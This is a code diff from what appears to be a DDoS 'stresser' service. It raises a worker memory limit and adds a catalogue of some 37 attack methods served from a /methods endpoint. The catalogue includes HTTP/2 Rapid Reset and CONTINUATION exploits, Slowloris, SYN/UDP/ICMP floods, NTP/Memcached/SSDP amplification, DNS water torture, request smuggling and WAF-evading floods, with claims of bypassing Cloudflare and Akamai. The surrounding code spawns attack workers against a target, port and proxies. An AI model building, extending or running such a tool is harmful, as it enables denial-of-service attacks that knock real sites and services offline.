@@ -376,7 +376,7 @@ function spawnPool(
       // NOTE: do NOT use NODE_ENV — dev script sets NODE_ENV=production.
       const workerOpts: import("worker_threads").WorkerOptions = {
         workerData: { method, target, port, threads: t, proxies },
-        resourceLimits: { maxOldGenerationSizeMb: IS_DEPLOYED ? 1024 : 64 },
+        resourceLimits: { maxOldGenerationSizeMb: IS_DEPLOYED ? 1024 : 256 },
       };
       const w = new Worker(WORKER_FILE, workerOpts);
       const idx = i;
@@ -712,6 +712,56 @@ async function runAttackWorkers(
   // All other real-network methods: single pool of CPU_COUNT workers
   await spawnPool(method, target, port, threads, CPU_COUNT, signal, onStats);
 }
+
+// ── Static method catalogue ───────────────────────────────────────────────
+const METHODS_CATALOGUE = [
+  // Geass / Special
+  { id: "geass-override",       name: "Geass Override ∞ [ARES 35v]",          layer: "ALL",  protocol: "TCP/UDP/H2/TLS",       tier: "ARES",   description: "MAX POWER — 35 simultaneous attack vectors: H2+TCP+UDP+TLS+Slowloris+WAF+WebSocket+GraphQL+RUDY+Cache+Pipeline+Smuggling+QUIC+ICMP+DNS+NTP+Memcached+SSDP+DoH+gRPC" },
+  // L7 Application
+  { id: "waf-bypass",           name: "Geass WAF Bypass",                     layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF with 7 concurrent vectors" },
+  { id: "http2-flood",          name: "HTTP/2 Rapid Reset",                   layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "CVE-2023-44487 — 512-stream RST burst per session, millions req/s" },
+  { id: "http2-continuation",   name: "H2 CONTINUATION (CVE-2024-27316)",     layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "CVE-2024-27316 — endless CONTINUATION frames, nginx/Apache OOM — NO patch for nginx ≤1.25.4" },
+  { id: "hpack-bomb",           name: "HPACK Bomb (RFC 7541)",                layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "Incremental-indexed headers → HPACK table eviction storm" },
+  { id: "h2-settings-storm",    name: "H2 Settings Storm",                    layer: "L7",   protocol: "HTTP/2",               tier: "A",      description: "SETTINGS oscillation + WINDOW_UPDATE flood — 3-layer H2 CPU+memory drain" },
+  { id: "http-pipeline",        name: "HTTP Pipeline Flood",                  layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "HTTP/1.1 keep-alive pipelining — 512 reqs per TCP write, no wait, 300K+ req/s" },
+  { id: "ws-flood",             name: "WebSocket Exhaustion",                 layer: "L7",   protocol: "WebSocket",            tier: "A",      description: "Holds thousands of WS conns open — goroutine/thread per conn" },
+  { id: "cache-poison",         name: "CDN Cache Poisoning DoS",              layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "Fills CDN cache with unique keys — 100% origin miss rate eviction" },
+  { id: "slowloris",            name: "Slowloris",                            layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "25K half-open connections — starves nginx/apache thread pool" },
+  { id: "conn-flood",           name: "TLS Connection Flood",                 layer: "L7",   protocol: "TLS",                  tier: "A",      description: "Opens & holds thousands of TLS sockets — pre-HTTP exhaustion" },
+  { id: "tls-renego",           name: "TLS Renegotiation DoS",                layer: "TLS",  protocol: "TLS",                  tier: "A",      description: "Forces TLS 1.2 renegotiation — expensive public-key CPU per conn" },
+  { id: "rudy-v2",              name: "RUDY v2 — Multipart SlowPOST",         layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "multipart/form-data + 70-char boundary — holds server threads, harder to detect" },
+  { id: "http-flood",           name: "HTTP Flood",                           layer: "L7",   protocol: "HTTP",                 tier: "B",      description: "High-volume HTTP GET — overwhelms web server resources directly" },
+  { id: "http-bypass",          name: "HTTP Bypass",                          layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "Chrome-fingerprinted 3-layer: fetch+Chrome headers+slow drain — defeats WAF/CDN" },
+  // L4 Transport
+  { id: "quic-flood",           name: "QUIC/HTTP3 Flood (RFC 9000)",          layer: "L4",   protocol: "QUIC/UDP",             tier: "A",      description: "QUIC Initial packets — server allocates crypto state per DCID → OOM" },
+  { id: "ssl-death",            name: "SSL Death Record",                     layer: "TLS",  protocol: "TLS",                  tier: "A",      description: "1-byte TLS records — 40K AES-GCM decrypts/sec on server CPU" },
+  { id: "udp-flood",            name: "UDP Flood",                            layer: "L4",   protocol: "UDP",                  tier: "B",      description: "Raw UDP packet flood — saturates L4 bandwidth" },
+  { id: "syn-flood",            name: "SYN Flood",                            layer: "L4",   protocol: "TCP",                  tier: "B",      description: "TCP SYN_RECV exhaustion — fills connection table pre-handshake" },
+  { id: "tcp-flood",            name: "TCP Flood",                            layer: "L4",   protocol: "TCP",                  tier: "B",      description: "Raw TCP packet flood against open ports" },
+  // L3 Network
+  { id: "icmp-flood",           name: "ICMP Flood [3-tier engine]",           layer: "L3",   protocol: "ICMP",                 tier: "B",      description: "Real ICMP: raw-socket (CAP_NET_RAW), hping3, UDP saturation burst" },
+  { id: "ntp-amp",              name: "NTP Flood [mode7+mode3]",              layer: "L3",   protocol: "NTP/UDP",              tier: "B",      description: "Real NTP binary protocol — mode7 monlist (CVE-2013-5211) + mode3 to port 123" },
+  { id: "dns-amp",              name: "DNS Water Torture [CDN-bypass]",       layer: "L3",   protocol: "DNS",                  tier: "A",      description: "Floods NS servers with random subdomains — bypasses Cloudflare/CDN entirely" },
+  { id: "mem-amp",              name: "Memcached UDP Flood [binary]",         layer: "L3",   protocol: "Memcached/UDP",        tier: "B",      description: "Real Memcached binary protocol UDP — get+stats to port 11211" },
+  { id: "ssdp-amp",             name: "SSDP M-SEARCH Flood [UPnP]",          layer: "L3",   protocol: "SSDP/UDP",             tier: "B",      description: "Real SSDP protocol to port 1900 — rotates ST targets, UPnP stack exhaustion" },
+  // ARES OMNIVECT ∞
+  { id: "slow-read",            name: "Slow Read — TCP Buffer Exhaust",       layer: "L7",   protocol: "TCP",                  tier: "A",      description: "Pauses TCP recv window — server send buffer fills, all threads block on write" },
+  { id: "range-flood",          name: "Range Flood — 500× I/O",              layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "500 byte-range sub-requests per req — server disk/IO seek queue exhausted" },
+  { id: "xml-bomb",             name: "XML Bomb — Billion Laughs XXE",        layer: "L7",   protocol: "HTTP/XML",             tier: "A",      description: "Nested XML entity expansion — parser OOM crash on any SOAP/XMLRPC endpoint" },
+  { id: "h2-ping-storm",        name: "H2 PING Storm — RFC 7540 §6.7",        layer: "L7",   protocol: "HTTP/2",               tier: "A",      description: "300 PING frames/burst × 2ms per conn — server must ACK every one; CPU exhaustion" },
+  { id: "http-smuggling",       name: "HTTP Request Smuggling — TE/CL Desync",layer: "L7",   protocol: "HTTP/1.1",             tier: "S",      description: "Transfer-Encoding/Content-Length desync — poisons backend request queue permanently" },
+  { id: "doh-flood",            name: "DoH Flood — DNS-over-HTTPS Exhaust",   layer: "L7",   protocol: "HTTPS/DNS",            tier: "A",      description: "Wire-format DNS queries via HTTPS — exhausts recursive resolver thread pool" },
+  { id: "keepalive-exhaust",    name: "Keepalive Exhaust — 256-Req Pipeline", layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "256-request pipeline per conn held 10-20s — MaxKeepAliveRequests saturation" },
+  { id: "app-smart-flood",      name: "App Smart Flood — DB Query Exhaust",   layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "POST to /login /search /checkout — forces DB queries, uncacheable" },
+  { id: "large-header-bomb",    name: "Large Header Bomb — 32KB Headers",     layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "32KB randomized headers exhaust HTTP parser allocator, fills nginx header buffer" },
+  { id: "http2-priority-storm", name: "H2 Priority Storm — RFC 7540 §6.3",    layer: "L7",   protocol: "HTTP/2",               tier: "A",      description: "PRIORITY frames force server to rebuild stream dependency tree — 150K frames/sec" },
+  { id: "h2-rst-burst",         name: "H2 RST Burst — CVE-2023-44487",        layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "HEADERS+RST_STREAM pairs — pure write-path overload, zero read-side pressure" },
+  { id: "grpc-flood",           name: "gRPC Flood — Handler Pool Exhaust",    layer: "L7",   protocol: "gRPC/HTTP2",           tier: "A",      description: "application/grpc content-type — exhausts gRPC handler thread pool" },
+];
+
+router.get("/methods", (_req, res): void => {
+  res.json(METHODS_CATALOGUE);
+});
 
 // ── Routes ────────────────────────────────────────────────────────────────
 router.get("/attacks", async (_req, res): Promise<void> => {
